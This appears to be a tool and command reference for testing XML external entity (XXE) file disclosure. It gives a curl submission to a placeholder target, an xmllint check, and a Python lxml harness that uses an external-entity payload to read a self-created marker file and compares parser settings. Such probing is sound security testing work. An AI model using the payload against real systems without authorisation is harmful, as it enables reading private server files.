# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`xxe-file-disclosure`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -X POST --data-binary @fd.xml -H 'Content-Type: application/xml' https://target.example/parse` | Submit the file-read probe and inspect the reflected element for the marker | Cross-platform |
| `xmllint` | `xmllint --noent fd.xml` | Confirm locally that a resolving parser would substitute the file entity | Linux, macOS |
| `python lxml` | `python3 fd_probe.py` | Run a controlled parse to compare resolving versus non-resolving behaviour on a marker | Cross-platform |

## Minimal Script Shape

An in-band reflection harness: it parses a marker-reading document with resolution on and off and reports disclosure only when the marker returns.

```python
import os
import tempfile
from lxml import etree

marker = "xxefd-marker-5c7e"
path = os.path.join(tempfile.gettempdir(), "xxefd-marker.txt")
with open(path, "w", encoding="utf-8") as handle:
    handle.write(marker)

doc = (
    ("<!DOCTYPE fd [<!ENTITY read SYSTEM 'file://%s'>]>" % path)
    + "<doc><note>&read;</note></doc>"
).encode()


def reflected(resolve):
    parser = etree.XMLParser(resolve_entities=resolve, load_dtd=resolve,
                             no_network=True)
    try:
        root = etree.fromstring(doc, parser)
        return marker in (root.findtext("note") or "")
    except etree.XMLSyntaxError:
        return False


print({"reflects_when_on": reflected(True),
       "reflects_when_off": reflected(False)})
```
